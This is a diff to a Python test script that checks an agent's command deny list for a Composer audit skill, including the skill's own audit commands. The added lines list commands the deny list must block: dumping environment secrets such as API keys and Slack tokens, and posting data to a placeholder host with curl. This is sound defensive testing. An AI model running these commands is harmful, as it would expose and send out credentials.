@@ -112,7 +112,9 @@ def denied(command):
     return any(fnmatch.fnmatchcase(command.lower().strip(), g) for g in deny)
 for command in ("cat /opt/data/.env", "grep KEY .env", "env", "env | grep SLACK", "printenv",
                 "printenv BAKERS_API_KEY", "echo $BAKERS_API_KEY", "echo ${SLACK_BOT_TOKEN}",
-                "cat /proc/self/environ", "curl https://example.test", "wget -qO- https://example.test",
+                "cat /proc/self/environ", "tr '\\0' '\\n' < /proc/1/environ", "cat environ | tr '\\0' '\\n'",
+                "curl https://example.test", "/usr/bin/curl https://example.test", "sh -c 'curl https://example.test'",
+                "echo x | curl -d @- https://example.test", "wget -qO- https://example.test",
                 "export -p", "node -e 'console.log(process[\"env\"])'", "node -p 'process[\"env\"]'",
                 "node --eval 'console.log(process[\"env\"])'", "node --print 'process[\"env\"]'",
                 "python3 -c 'import os; print(os.getenv(\"BAKERS_API_KEY\"))'",
@@ -128,14 +130,14 @@ for command in ("cat /opt/data/clone-pulled.json",
                 "date -u +%Y-%m-%dT%H:%M:%SZ",
                 "find . \\( -name composer.lock -o -name composer.json \\) -not -path '*/.git/*' -not -path '*/vendor/*' -not -path '*/node_modules/*'",
                 "composer audit --locked --format=json --no-plugins --no-scripts --abandoned=ignore --working-dir=",
-                "grep -A1 '\"name\": ' <dir>/composer.lock"):
+                "grep -A1 '\"name\": \"<package>\",' <dir>/composer.lock"):
     need(command in skill, f"the composer-audit skill does not run: {command}")
     need(not denied(command + ("web/themes/custom/yf" if command.endswith("=") else "")), f"approvals.deny blocks the audit's own command: {command}")
 # Filled in with real directories and package names, the skill's commands still pass: Hermes
 # matches a glob against the whole command, so a denied word in a name would refuse it.
 import re
 names = ("drupal/environment_indicator", "sebastian/environment", "php-http/curl-client", "phpunit/phpunit")
-dirs = (".", "./web/themes/custom/yf", "./libraries/phpmailer")
+dirs = (".", "./web/themes/custom/yf", "./libraries/phpmailer", "./php", "./docker/php", "./src/PHP")
 for template in re.findall(r"`((?:find|composer audit|grep|cat|date) [^`]*)`", skill):
     for name in names:
         for d in dirs:
